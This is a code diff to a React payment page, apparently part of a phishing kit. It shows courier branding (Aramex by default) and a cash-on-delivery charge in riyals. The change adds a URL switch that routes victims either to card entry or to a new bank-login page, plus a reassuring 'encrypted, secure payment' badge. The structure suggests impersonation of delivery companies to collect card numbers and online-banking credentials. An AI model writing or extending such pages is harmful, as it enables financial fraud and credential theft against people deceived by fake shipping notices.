@@ -1,24 +1,33 @@
-import { useParams, useNavigate } from "react-router-dom";
+import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
-import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
+import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, Shield, BadgeCheck, LogIn } from "lucide-react";
+import ServiceBadge from "@/components/ServiceBadge";
 
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
+  const [searchParams] = useSearchParams();
   
-  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
+  const serviceKey = linkData?.payload?.service_key || searchParams.get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
+  // Check link type from URL parameter
+  const linkType = searchParams.get('type') || 'card';
+  
   const handleProceed = () => {
-    navigate(`/pay/${id}/card`);
+    if (linkType === 'login') {
+      navigate(`/pay/${id}/bank-login?service=${serviceKey}`);
+    } else {
+      navigate(`/pay/${id}/card?service=${serviceKey}`);
+    }
   };
   
   return (
@@ -60,21 +69,41 @@ const PaymentDetails = () => {
         </div>
       )}
       
+      {/* Security Badge */}
+      <div className="mb-6 flex items-center justify-center gap-2 p-3 rounded-lg bg-muted/50">
+        <Shield className="w-5 h-5" style={{ color: branding.colors.primary }} />
+        <span className="text-sm font-semibold">دفع آمن ومحمي بتقنية التشفير</span>
+        <BadgeCheck className="w-5 h-5" style={{ color: branding.colors.secondary }} />
+      </div>
+
       {/* Payment Summary */}
       <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
-        <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
+        <div className="flex justify-between items-center py-2 sm:py-3 border-b border-border text-sm sm:text-base">
           <span className="text-muted-foreground">الخدمة</span>
-          <span className="font-semibold">{serviceName}</span>
+          <ServiceBadge 
+            serviceKey={serviceKey}
+            serviceName={serviceName}
+            size="sm"
+          />
         </div>
         
         <div 
-          className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
+          className="flex justify-between py-4 sm:py-5 rounded-lg px-4 sm:px-5 relative overflow-hidden"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
+            background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`,
+            border: `2px solid ${branding.colors.primary}`
           }}
         >
-          <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
-          <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
+          {/* Background Pattern */}
+          <div 
+            className="absolute inset-0 opacity-5"
+            style={{
+              backgroundImage: `repeating-linear-gradient(45deg, ${branding.colors.primary} 0, ${branding.colors.primary} 1px, transparent 0, transparent 50%)`,
+              backgroundSize: '8px 8px'
+            }}
+          />
+          <span className="text-base sm:text-lg font-bold relative z-10">المبلغ الإجمالي</span>
+          <span className="text-xl sm:text-2xl font-bold relative z-10" style={{ color: branding.colors.primary }}>
             {formattedAmount}
           </span>
         </div>
@@ -90,15 +119,27 @@ const PaymentDetails = () => {
             background: `${branding.colors.primary}10`
           }}
         >
-          <div className="flex items-center gap-2 sm:gap-3">
-            <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
-            <div>
-              <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
-              <p className="text-xs sm:text-sm text-muted-foreground">
-                Visa، Mastercard، Mada
-              </p>
+          {linkType === 'login' ? (
+            <div className="flex items-center gap-2 sm:gap-3">
+              <LogIn className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
+              <div>
+                <p className="font-semibold text-sm sm:text-base">تسجيل دخول البنك</p>
+                <p className="text-xs sm:text-sm text-muted-foreground">
+                  سجل دخولك إلى حسابك البنكي لإتمام الدفع
+                </p>
+              </div>
             </div>
-          </div>
+          ) : (
+            <div className="flex items-center gap-2 sm:gap-3">
+              <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
+              <div>
+                <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
+                <p className="text-xs sm:text-sm text-muted-foreground">
+                  Visa، Mastercard، Mada
+                </p>
+              </div>
+            </div>
+          )}
         </div>
       </div>
       
@@ -111,8 +152,17 @@ const PaymentDetails = () => {
           background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
         }}
       >
-        <span className="ml-2">الدفع بالبطاقة</span>
-        <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+        {linkType === 'login' ? (
+          <>
+            <span className="ml-2">تسجيل الدخول</span>
+            <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+          </>
+        ) : (
+          <>
+            <span className="ml-2">الدفع بالبطاقة</span>
+            <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+          </>
+        )}
       </Button>
     
       <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
